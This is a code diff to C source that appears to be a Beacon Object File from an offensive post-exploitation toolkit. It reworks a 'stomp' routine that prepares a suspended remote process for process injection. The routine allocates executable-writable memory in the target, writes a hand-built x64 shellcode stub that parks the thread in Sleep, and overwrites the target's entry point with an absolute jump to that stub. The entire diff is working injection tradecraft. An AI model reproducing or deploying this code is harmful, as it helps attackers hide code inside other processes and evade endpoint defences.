@@ -583,8 +583,9 @@ done:
 
 /*
  * Suspended processes have not run the EXE entry point; LoadLibraryA (DllMain)
- * often returns NULL there. Patch EP to jmp $, ResumeThread so the loader
- * finishes init, then we can LoadLibraryEx real deps.
+ * often returns NULL there. Point EP at Sleep(INFINITE) so the primary thread
+ * parks (not a jmp-$ spin), ResumeThread for loader init, then we can
+ * LoadLibraryEx real deps.
  */
 static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
 {
@@ -595,10 +596,24 @@ static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
     IMAGE_DOS_HEADER* dos;
     IMAGE_NT_HEADERS64* nt;
     ULONG_PTR entry;
-    BYTE patch[2];
+    ULONG_PTR pSleep;
+    BYTE stub[32];
+    SIZE_T n = 0;
+    LPVOID remoteStub = NULL;
     DWORD oldProt = 0;
+    BYTE jmp[14];
+    ULONG_PTR stubAddr;
+    DWORD infinite = 0xFFFFFFFFu;
 
     if (!hProcess || !hThread) {
+        return FALSE;
+    }
+
+    pSleep = (ULONG_PTR)KERNEL32$GetProcAddress(
+        KERNEL32$GetModuleHandleA("kernel32.dll"),
+        "Sleep");
+    if (!pSleep) {
+        PpfStompFail("Sleep");
         return FALSE;
     }
 
@@ -632,14 +647,46 @@ static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
     nt = (IMAGE_NT_HEADERS64*)(hdr + dos->e_lfanew);
     entry = imageBase + nt->OptionalHeader.AddressOfEntryPoint;
 
-    patch[0] = 0xEB; /* jmp $ */
-    patch[1] = 0xFE;
+    /*
+     * remoteStub:
+     *   sub rsp, 28h
+     *   mov ecx, INFINITE
+     *   mov rax, Sleep
+     *   call rax
+     *   jmp $          ; only if Sleep returns
+     */
+    remoteStub = PpfStompRemoteAlloc(hProcess, 64, PAGE_EXECUTE_READWRITE);
+    if (!remoteStub) {
+        PpfStompFail("alloc sleep stub");
+        return FALSE;
+    }
+    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
+    stub[n++] = 0xB9;
+    MSVCRT$memcpy(stub + n, &infinite, 4); n += 4;
+    stub[n++] = 0x48; stub[n++] = 0xB8;
+    MSVCRT$memcpy(stub + n, &pSleep, 8); n += 8;
+    stub[n++] = 0xFF; stub[n++] = 0xD0;
+    stub[n++] = 0xEB; stub[n++] = 0xFE;
+    if (!PpfStompRemoteWrite(hProcess, remoteStub, stub, n)) {
+        PpfStompFail("write sleep stub");
+        return FALSE;
+    }
+
+    /* EP -> jmp [rip+0]; dq remoteStub  (14-byte absolute jump) */
+    stubAddr = (ULONG_PTR)remoteStub;
+    jmp[0] = 0xFF;
+    jmp[1] = 0x25;
+    jmp[2] = 0x00;
+    jmp[3] = 0x00;
+    jmp[4] = 0x00;
+    jmp[5] = 0x00;
+    MSVCRT$memcpy(jmp + 6, &stubAddr, 8);
     if (!KERNEL32$VirtualProtectEx(
-            hProcess, (LPVOID)entry, 2, PAGE_EXECUTE_READWRITE, &oldProt)) {
+            hProcess, (LPVOID)entry, sizeof(jmp), PAGE_EXECUTE_READWRITE, &oldProt)) {
         PpfStompFail("protect EP");
         return FALSE;
     }
-    if (!PpfStompRemoteWrite(hProcess, (LPVOID)entry, patch, 2)) {
+    if (!PpfStompRemoteWrite(hProcess, (LPVOID)entry, jmp, sizeof(jmp))) {
         PpfStompFail("patch EP");
         return FALSE;
     }
@@ -647,7 +694,7 @@ static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
         PpfStompFail("ResumeThread");
         return FALSE;
     }
-    /* Let ntdll finish process/thread init while primary spins. */
+    /* Let ntdll finish process/thread init; primary then blocks in Sleep. */
     KERNEL32$Sleep(300);
     return TRUE;
 }
